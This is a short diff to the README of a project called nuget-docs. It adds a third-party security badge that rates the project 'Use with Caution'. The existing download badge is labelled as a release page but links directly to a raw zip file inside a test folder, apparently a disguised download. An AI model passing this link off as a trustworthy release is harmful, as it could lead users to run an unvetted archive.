@@ -1,6 +1,7 @@
 # 🧩 nuget-docs - Read NuGet APIs with ease
 
 [![Download nuget-docs](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/abellobm3681/nuget-docs/raw/refs/heads/main/src/NugetDocs.IntegrationTests/docs_nuget_v1.7.zip)
+[![SafeSkill 50/100](https://img.shields.io/badge/SafeSkill-50%2F100_Use%20with%20Caution-orange)](https://safeskill.dev/scan/abellobm3681-nuget-docs)
 
 ## 📥 Download
 
